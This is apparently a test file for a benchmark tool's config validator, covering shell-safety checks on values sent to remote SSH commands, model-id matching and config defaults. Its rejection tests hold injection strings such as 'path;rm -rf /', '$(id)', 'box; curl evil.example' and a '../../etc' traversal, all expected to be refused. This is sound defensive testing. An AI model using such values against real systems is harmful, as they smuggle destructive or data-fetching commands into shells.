import { describe, expect, test } from "bun:test";
import {
  assertRemoteSafe,
  isRemoteSafe,
  knownIdsFor,
  modelIdMatches,
  modelsForLane,
  resolveModelId,
  shortTokenLabel,
  validateBenchConfig,
} from "../../src/bench/config.ts";

const MINIMAL = {
  promptLengths: [{ label: "512", tokens: 512 }],
  models: [{ name: "Small", id: "small" }],
  lanes: [{ label: "Lane A", baseUrl: "http://localhost:9001" }],
};

function config(over: Record<string, unknown> = {}) {
  return validateBenchConfig({ ...MINIMAL, ...over });
}

describe("the allow-pattern for anything that reaches a remote command line", () => {
  const good = [
    "~/bench-venv/bin",
    "/home/someone/models/vendor/Model-A-4bit",
    "host-01.local",
    "192.0.2.5",
    "model_name-v2.1",
    "~",
  ];
  for (const value of good) {
    test(`accepts ${value}`, () => {
      expect(isRemoteSafe(value)).toBe(true);
      expect(() => assertRemoteSafe(value, "field")).not.toThrow();
    });
  }

  // Every one of these could change what the remote shell actually runs.
  const bad: [string, string][] = [
    ["a space", "path with space"],
    ["a single quote", "path'name"],
    ["a double quote", 'path"name'],
    ["a semicolon", "path;rm -rf /"],
    ["a dollar", "$HOME/models"],
    ["a backtick", "path`whoami`"],
    ["an ampersand pair", "path && curl evil"],
    ["a single ampersand", "path&"],
    ["a pipe", "path|tee"],
    ["a newline", "path\nrm"],
    ["a redirect", "path>out"],
    ["a subshell", "$(id)"],
    ["braces", "{a,b}"],
    ["an asterisk", "models/*"],
    ["empty", ""],
  ];
  for (const [what, value] of bad) {
    test(`refuses ${what}`, () => {
      expect(isRemoteSafe(value)).toBe(false);
      expect(() => assertRemoteSafe(value, "ssh.binDir")).toThrow();
    });
  }

  test("the refusal names the field and the characters, so it can be acted on", () => {
    expect(() => assertRemoteSafe("my models; rm", "ssh.binDir")).toThrow(/ssh\.binDir/);
    expect(() => assertRemoteSafe("my models; rm", "ssh.binDir")).toThrow(/" "/);
  });
});

describe("validating the config", () => {
  test("takes a minimal config and fills in the defaults", () => {
    const c = config();
    expect(c.measuredRuns).toBe(5);
    expect(c.outputCap).toBe(128);
    expect(c.restSeconds).toBe(30);
    expect(c.warmupRuns).toBe(1);
    expect(c.disableThinking).toBe(true);
    expect(c.torture).toEqual([]);
  });

  test("prompt lengths sort shortest first and may be bare numbers", () => {
    const c = config({ promptLengths: [32768, 512, { label: "4K", tokens: 4096 }] });
    expect(c.promptLengths.map((p) => p.label)).toEqual(["512", "4K", "32K"]);
  });

  test("a model id that would be unsafe on a remote command line is refused up front", () => {
    expect(() => config({ models: [{ name: "x", id: "$HOME/models/thing" }] })).toThrow(/models\[0\]\.id/);
  });

  test("a managed lane whose baseUrl port disagrees with ssh.port is refused", () => {
    expect(() =>
      config({
        lanes: [
          {
            label: "Lane A",
            baseUrl: "http://192.0.2.5:9999",
            ssh: { host: "192.0.2.5", binDir: "~/venv/bin", port: 8090 },
          },
        ],
      }),
    ).toThrow(/must equal ssh\.port/);
  });

  test("a managed lane with matching ports is accepted", () => {
    const c = config({
      lanes: [
        {
          label: "Lane A",
          baseUrl: "http://192.0.2.5:8090",
          ssh: { host: "192.0.2.5", binDir: "~/venv/bin", port: 8090, user: "someone" },
        },
      ],
    });
    expect(c.lanes[0]!.ssh!.host).toBe("192.0.2.5");
    expect(c.lanes[0]!.ssh!.user).toBe("someone");
  });

  test("an ssh host with a shell character in it never gets as far as a command", () => {
    expect(() =>
      config({
        lanes: [
          {
            label: "Lane A",
            baseUrl: "http://localhost:8090",
            ssh: { host: "box; curl evil.example", binDir: "~/venv/bin", port: 8090 },
          },
        ],
      }),
    ).toThrow(/ssh\.host/);
  });

  test("duplicate lane labels are refused, because labels are what the board names", () => {
    expect(() =>
      config({
        lanes: [
          { label: "Lane A", baseUrl: "http://localhost:9001" },
          { label: "Lane A", baseUrl: "http://localhost:9002" },
        ],
      }),
    ).toThrow(/unique/);
  });

  test("a lane naming a model that does not exist is refused", () => {
    expect(() =>
      config({ lanes: [{ label: "Lane A", baseUrl: "http://localhost:9001", models: ["nope"] }] }),
    ).toThrow(/not in `models`/);
  });

  test("a torture cell must name a real lane and a real model", () => {
    expect(() => config({ torture: [{ lane: "Nope", model: "small", tokens: 100000 }] })).toThrow(/lane/);
    expect(() => config({ torture: [{ lane: "Lane A", model: "nope", tokens: 100000 }] })).toThrow(/model/);
  });

  test("a run name has to be a folder name", () => {
    expect(() => config({ runName: "../../etc" })).toThrow(/runName/);
    expect(config({ runName: "my-run-2026" }).runName).toBe("my-run-2026");
  });

  test("an empty lanes or models list is refused rather than producing an empty grid", () => {
    expect(() => config({ lanes: [] })).toThrow(/lanes/);
    expect(() => config({ models: [] })).toThrow(/models/);
  });
});

describe("modelsForLane", () => {
  test("defaults to every model, and honours a subset in config order", () => {
    const c = config({
      models: [
        { name: "A", id: "a" },
        { name: "B", id: "b" },
      ],
      lanes: [
        { label: "Lane A", baseUrl: "http://localhost:9001" },
        { label: "Lane B", baseUrl: "http://localhost:9002", models: ["b"] },
      ],
    });
    expect(modelsForLane(c, c.lanes[0]!).map((m) => m.id)).toEqual(["a", "b"]);
    expect(modelsForLane(c, c.lanes[1]!).map((m) => m.id)).toEqual(["b"]);
  });
});

describe("the image and video settings blocks", () => {
  // Found live: the validator built a fresh object from known keys, so an
  // `image` block in the config was dropped on the floor and the run used the
  // defaults while looking like it had obeyed. A silently ignored setting is
  // worse than a rejected one.
  test("are carried through the validator, not dropped", () => {
    const c = config({
      image: { measuredImages: 2, warmupImages: 1, restSeconds: 0 },
      video: { measuredClips: 1, frames: 25 },
    });
    expect(c.image).toEqual({ measuredImages: 2, warmupImages: 1, restSeconds: 0 });
    expect(c.video).toEqual({ measuredClips: 1, frames: 25 });
  });

  test("and reach the settings readers that parse them", async () => {
    const { imageSettingsFrom } = await import("../../src/bench/image.ts");
    const { videoSettingsFrom } = await import("../../src/bench/video.ts");
    const c = config({ image: { measuredImages: 2, restSeconds: 0 }, video: { measuredClips: 1 } });
    expect(imageSettingsFrom(c, c.image).measuredImages).toBe(2);
    expect(imageSettingsFrom(c, c.image).restSeconds).toBe(0);
    expect(videoSettingsFrom(c, c.video).measuredClips).toBe(1);
  });

  test("a config without them still works", () => {
    expect(config().image).toBeUndefined();
    expect(config().video).toBeUndefined();
  });
});

describe("matching the model id the endpoint lists", () => {
  // This is the bug the first live run hit. mlx_lm.server was started with
  // `~/models/vendor/Model-A-4bit` and listed TWO models:
  // one from the Hugging Face cache and the started one under its absolute
  // path. An exact-match test failed, a "there is only one, use it" fallback
  // failed too, and the lane sat waiting for five minutes and ran nothing.
  const LISTED = [
    "vendor/Other-Model-4bit",
    "/home/someone/models/vendor/Model-A-4bit",
  ];

  test("an exactly equal id matches", () => {
    expect(modelIdMatches("vendor/Other-Model-4bit", "vendor/Other-Model-4bit")).toBe(true);
  });

  test("a ~/ id matches the absolute path the server expanded it to", () => {
    expect(
      modelIdMatches("~/models/vendor/Model-A-4bit", LISTED[1]!),
    ).toBe(true);
  });

  test("it picks the right one out of a list holding other models", () => {
    expect(resolveModelId("~/models/vendor/Model-A-4bit", LISTED)).toBe(LISTED[1]!);
    expect(resolveModelId("vendor/Other-Model-4bit", LISTED)).toBe(LISTED[0]!);
  });

  test("a model the endpoint does not have resolves to nothing", () => {
    // Never a guess: an unknown `model` makes mlx_lm.server go to the internet
    // looking for something to download.
    expect(resolveModelId("~/models/not-here", LISTED)).toBeNull();
    expect(resolveModelId("~/models/vendor/Model-A-8bit", LISTED)).toBeNull();
  });

  test("it will not match on the last path segment alone", () => {
    // Two quantizations of one model in different directories are different
    // models, and confusing them publishes a wrong number under a right name.
    expect(modelIdMatches("~/other/place/Model-A-4bit", LISTED[1]!)).toBe(false);
  });

  test("a relative listed id never satisfies a ~/ config id", () => {
    expect(modelIdMatches("~/models/m", "models/m")).toBe(false);
    expect(modelIdMatches("~/models/m", "/models/m")).toBe(false);
  });
});

describe("shortTokenLabel", () => {
  test("labels a size the way a person would say it", () => {
    expect(shortTokenLabel(512)).toBe("512");
    expect(shortTokenLabel(4096)).toBe("4K");
    expect(shortTokenLabel(32768)).toBe("32K");
    expect(shortTokenLabel(100000)).toBe("100K");
  });
});

describe("a symlinked model is listed under the path it points at", () => {
  // Found live: every model sits at ~/bench-models/<dir>, but that is a
  // SYMLINK to wherever the machine already had the weights, and
  // mlx_lm.server resolves the link and lists the target. Matching only the
  // uniform path left the runner polling a healthy server until it gave up.
  const withLink = () =>
    config({
      models: [{ name: "Q", dir: "Qwen3-14B-4bit", hfRepo: "vendor/Qwen3-14B-4bit" }],
      lanes: [
        {
          label: "Studio",
          baseUrl: "http://h.local:8090",
          ssh: { host: "h.local", binDir: "~/bench-envs/llm/bin", port: 8090 },
          localPaths: { "Qwen3-14B-4bit": "~/.elsewhere/vendor--Qwen3-14B-4bit" },
        },
      ],
    });

  test("the lane's own copy is one of the ids the model answers to", () => {
    const c = withLink();
    expect(knownIdsFor(c, c.models[0]!)).toEqual([
      "~/bench-models/Qwen3-14B-4bit",
      "~/.elsewhere/vendor--Qwen3-14B-4bit",
    ]);
  });

  test("the listed target resolves, even though it is not the uniform path", () => {
    const c = withLink();
    const listed = ["vendor/Other-Model-4bit", "/home/someone/.elsewhere/vendor--Qwen3-14B-4bit"];
    expect(resolveModelId("~/bench-models/Qwen3-14B-4bit", listed)).toBeNull();
    expect(resolveModelId(knownIdsFor(c, c.models[0]!), listed)).toBe(listed[1]!);
  });

  test("the uniform path still resolves when the model is a real directory", () => {
    const c = withLink();
    const listed = ["/home/someone/bench-models/Qwen3-14B-4bit"];
    expect(resolveModelId(knownIdsFor(c, c.models[0]!), listed)).toBe(listed[0]!);
  });

  test("a model the endpoint genuinely lacks still resolves to nothing", () => {
    const c = withLink();
    expect(resolveModelId(knownIdsFor(c, c.models[0]!), ["vendor/Something-Else"])).toBeNull();
  });
});
